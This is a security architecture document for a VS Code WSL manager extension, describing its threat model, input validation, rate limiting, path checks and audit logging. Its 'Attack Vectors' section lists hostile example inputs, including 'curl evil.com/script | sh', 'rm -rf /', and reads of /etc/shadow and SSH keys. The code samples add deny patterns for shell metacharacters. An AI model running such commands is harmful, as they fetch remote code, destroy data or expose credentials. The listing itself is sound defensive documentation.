# Security Architecture

## Overview

VSC WSL Manager implements a comprehensive security architecture designed to protect against common vulnerabilities while maintaining usability. This document details the security measures, threat model, and implementation details.

## Security Principles

1. **Defense in Depth**: Multiple layers of security controls
2. **Least Privilege**: Minimal permissions required for operations
3. **Input Validation**: All user inputs are validated and sanitized
4. **Secure by Default**: Security features enabled out of the box
5. **Transparency**: Security events can be audited

## Threat Model

### Identified Threats

| Threat Category | Specific Threat | Impact | Likelihood | Mitigation |
|----------------|-----------------|---------|------------|------------|
| **Injection** | Command Injection | Critical | High | Use spawn() with argument arrays |
| **Injection** | Path Traversal | High | Medium | Path validation and normalization |
| **Resource Abuse** | DoS via Rate Limits | Medium | Medium | Per-operation rate limiting |
| **Information Disclosure** | Error Message Leakage | Low | High | Error message sanitization |
| **Unauthorized Access** | Unintended Operations | High | Low | Permission prompts |
| **Data Integrity** | Malicious TAR Import | Critical | Low | User warnings and validation |

### Attack Vectors

1. **Malicious Distribution Names**
   ```
   "; rm -rf / #
   ../../../etc/passwd
   ${HOME}/.ssh/id_rsa
   ```

2. **Path Manipulation**
   ```
   ../../sensitive/data.tar
   C:\Windows\System32\config\SAM
   \\.\CON\exploit
   ```

3. **Command Injection**
   ```
   test && curl evil.com/script | sh
   test; cat /etc/shadow
   test`whoami`
   ```

## Security Components

### 1. Input Validation Layer

**Location**: `src/utils/inputValidator.ts`

**Purpose**: First line of defense against malicious inputs

**Key Features**:
- Whitelist-based validation
- Pattern matching for dangerous inputs
- Length limits enforcement
- Character set restrictions

**Implementation**:
```typescript
class InputValidator {
    // Distribution name validation
    static validateDistributionName(name: string): ValidationResult {
        // Only allow alphanumeric, dash, underscore
        const PATTERN = /^[a-zA-Z0-9._-]+$/;
        
        // Check against reserved names
        const RESERVED = ['wsl', 'windows', 'system', 'root', 'admin'];
        
        // Detect injection attempts
        const DANGEROUS = [';', '&', '|', '$', '`', '\\n', '\\r'];
    }
}
```

### 2. Command Execution Security

**Location**: `src/utils/commandBuilder.ts`

**Purpose**: Prevent command injection attacks

**Key Features**:
- Uses `spawn()` exclusively (never `exec()`)
- Argument array construction
- Command whitelisting
- No shell interpretation

**Security Controls**:
```typescript
class CommandBuilder {
    // Whitelist of allowed WSL commands
    private static readonly ALLOWED_COMMANDS = new Set([
        '--list', '--terminate', '--unregister',
        '--export', '--import', '--set-default'
    ]);
    
    // Dangerous patterns to reject
    private static readonly DANGEROUS_PATTERNS = [
        /[;&|`$(){}[\]<>]/,  // Shell metacharacters
        /\.\./,              // Path traversal
        /[\x00-\x1F\x7F]/    // Control characters
    ];
}
```

### 3. Rate Limiting

**Location**: `src/security/securityValidator.ts`

**Purpose**: Prevent resource exhaustion and abuse

**Rate Limits**:
| Operation | Limit | Window | Rationale |
|-----------|-------|--------|-----------|
| Create | 10 | 1 minute | Prevent disk exhaustion |
| Import | 5 | 1 minute | Large file operations |
| Export | 20 | 1 minute | Read operations |
| Delete | 5 | 1 minute | Destructive operations |
| List | 60 | 1 minute | Frequent operations |
| Command | 30 | 1 minute | Arbitrary execution |

**Implementation**:
```typescript
class RateLimiter {
    private limits = new Map<string, RateLimit>();
    
    async checkLimit(operation: string): Promise<boolean> {
        const limit = this.limits.get(operation);
        const now = Date.now();
        
        // Sliding window algorithm
        limit.requests = limit.requests.filter(
            time => now - time < limit.window
        );
        
        if (limit.requests.length >= limit.max) {
            return false; // Rate limit exceeded
        }
        
        limit.requests.push(now);
        return true;
    }
}
```

### 4. Path Security

**File Path Validation**:
- Normalize paths to prevent tricks
- Check for traversal patterns
- Validate against base paths
- Reject dangerous characters

```typescript
validateFilePath(filePath: string, options?: PathOptions): ValidationResult {
    const normalized = path.normalize(filePath);
    
    // Prevent traversal
    if (normalized.includes('..')) {
        return { isValid: false, error: 'Path traversal detected' };
    }
    
    // Check against base path
    if (options?.basePath) {
        const resolved = path.resolve(options.basePath, normalized);
        if (!resolved.startsWith(path.resolve(options.basePath))) {
            return { isValid: false, error: 'Path escapes base directory' };
        }
    }
}
```

### 5. Permission System

**Restricted Operations**:
- Delete distribution
- Import distribution (configurable)
- Export distribution (configurable)
- Create distribution (configurable)

**Implementation**:
```typescript
async checkPermission(operation: string): Promise<boolean> {
    const restricted = workspace.getConfiguration('wsl-manager.security')
        .get<string[]>('restrictedOperations', ['delete']);
    
    if (!restricted.includes(operation)) {
        return true; // Not restricted
    }
    
    // Prompt user
    const answer = await window.showWarningMessage(
        `This operation (${operation}) requires confirmation. Continue?`,
        'Yes', 'No'
    );
    
    return answer === 'Yes';
}
```

### 6. Audit Logging

**Security Events Logged**:
- Command executions
- Permission checks
- Rate limit violations
- Validation failures
- Suspicious patterns

**Log Format**:
```json
{
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "timestamp": "2024-01-10T15:30:00Z",
    "event": "command_execution",
    "user": "vscode-user",
    "command": "create",
    "args": ["test-distro", "Ubuntu"],
    "success": true,
    "error": null,
    "metadata": {
        "duration": 1234,
        "rateLimit": { "remaining": 9, "window": 60000 }
    }
}
```

## Security Patterns

### 1. Suspicious Activity Detection

The extension monitors for patterns indicating potential attacks:

- **Repeated identical commands** (>3 in 5 seconds)
- **Rapid command execution** (>5 different commands in 1 second)
- **Extremely long arguments** (>1000 characters)
- **Encoded payloads** (Base64, hex, URL encoding)
- **Known attack patterns**

### 2. Error Handling Security

```typescript
// Bad: Exposes system information
throw new Error(`Failed to read /home/user/.wsl/config: EACCES`);

// Good: Generic error with guidance
throw new WSLError(
    ErrorType.PERMISSION_DENIED,
    'Unable to access configuration',
    'Check file permissions',
    ['Run VS Code as Administrator', 'Check antivirus settings']
);
```

### 3. Temporary File Security

```typescript
// Secure temporary file creation
const tempDir = process.env.TEMP || '/tmp';
const randomSuffix = crypto.randomBytes(8).toString('hex');
const tempPath = path.join(tempDir, `wsl-${randomSuffix}.tar`);

try {
    // Use temp file
} finally {
    // Always cleanup
    await fs.promises.unlink(tempPath).catch(() => {});
}
```

## Configuration

### Security Settings

```json
{
    "wsl-manager.security.restrictedOperations": ["delete"],
    "wsl-manager.security.enableSecurityLogging": false,
    "wsl-manager.security.maxDistributionNameLength": 64,
    "wsl-manager.security.allowedDistributionPattern": "^[a-zA-Z0-9._-]+$"
}
```

### Logging Configuration

```json
{
    "wsl-manager.logging.level": "info",
    "wsl-manager.logging.enableFileLogging": false,
    "wsl-manager.logging.sanitizeData": true,
    "wsl-manager.logging.retentionDays": 7
}
```

## Security Best Practices

### For Users

1. **Verify TAR Sources**: Only import TAR files from trusted sources
2. **Use Strong Names**: Avoid special characters in distribution names
3. **Regular Backups**: Export important distributions regularly
4. **Monitor Logs**: Enable security logging for sensitive environments
5. **Update Regularly**: Keep the extension updated for security patches

### For Contributors

1. **Never Use exec()**: Always use spawn() with argument arrays
2. **Validate Everything**: Assume all input is malicious
3. **Sanitize Outputs**: Never expose system paths or sensitive data
4. **Test Security**: Include security test cases
5. **Document Threats**: Update threat model for new features

## Incident Response

### Security Issue Reporting

1. **Do NOT** create public issues for security vulnerabilities
2. Email security concerns to: security@example.com
3. Include:
   - Description of vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if any)

### Response Timeline

- **Acknowledgment**: Within 48 hours
- **Initial Assessment**: Within 7 days
- **Fix Development**: Based on severity
- **Disclosure**: Coordinated with reporter

## Security Checklist

Before each release:

- [ ] All inputs validated
- [ ] No exec() usage
- [ ] Paths properly sanitized
- [ ] Rate limits enforced
- [ ] Errors don't leak info
- [ ] Audit logging works
- [ ] Security tests pass
- [ ] Dependencies updated
- [ ] Threat model reviewed

## Compliance

The extension follows security best practices aligned with:

- OWASP Secure Coding Practices
- Microsoft Security Development Lifecycle
- VS Code Extension Security Guidelines

---

For more information:
- [Architecture Overview](overview.md)
- [Contributing Guidelines](../../CONTRIBUTING.md)
- [Security Policy](../../SECURITY.md)